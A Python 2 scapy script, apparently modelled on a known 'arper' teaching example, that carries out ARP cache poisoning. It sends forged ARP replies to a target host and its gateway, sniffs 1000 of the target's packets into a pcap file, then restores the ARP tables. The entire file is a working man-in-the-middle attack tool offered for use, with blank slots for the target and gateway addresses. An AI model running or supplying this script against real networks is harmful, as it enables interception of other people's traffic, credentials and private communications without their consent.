# coding=utf-8

import os
import sys
import threading
import time
import signal
from scapy.all import conf, sniff, wrpcap, ARP, send, srp, Ether


interface = 'en0'
target_ip = ''
gateway_ip = ''
packet_count = 1000


# 设置嗅探的网卡
conf.iface = interface

# 关闭输出
conf.verb = 0

print '[*] Setting up {}'.format(interface)


def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    print '[*] Restoring target...'
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip,
             hwdst='ff:ff:ff:ff:ff:ff', hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip,
             hwdst='ff:ff:ff:ff:ff:ff', hwsrc=target_mac), count=5)
    os.kill(os.getpid(), signal.SIGINT)


def get_mac(ip_address):
    responses, unanswered = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip_address),
                                timeout=2, retry=10)
    for s, r in responses:
        return r[Ether].src
    return


def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print '[*] Beginning the ARP poison.'

    while True:
        try:
            send(poison_target)
            send(poison_gateway)
            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    print '[*] ARP poison attack finished.'
    return


gateway_mac = get_mac(gateway_ip)

if not gateway_mac:
    print '[!!!] Failed to get gateway MAC. Exiting.'
    sys.exit(0)
else:
    print '[*] Gateway {} is at {}'.format(gateway_ip, gateway_mac)

target_mac = get_mac(target_ip)

if not target_mac:
    print '[!!!] Failed to get target MAC. Exiting.'
    sys.exit(0)
else:
    print '[*] Target {} is at {}'.format(target_ip, target_mac)

poison_thread = threading.Thread(target=poison_target,
                                 args=(gateway_ip, gateway_mac, target_ip, target_mac))

poison_thread.start()

try:
    print '[*] Starting sniffer for {} packets'.format(packet_count)

    bpf_filter = 'ip host {}'.format(target_ip)
    packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)

    wrpcap('arper.pcap', packets)
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
except KeyboardInterrupt:
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)
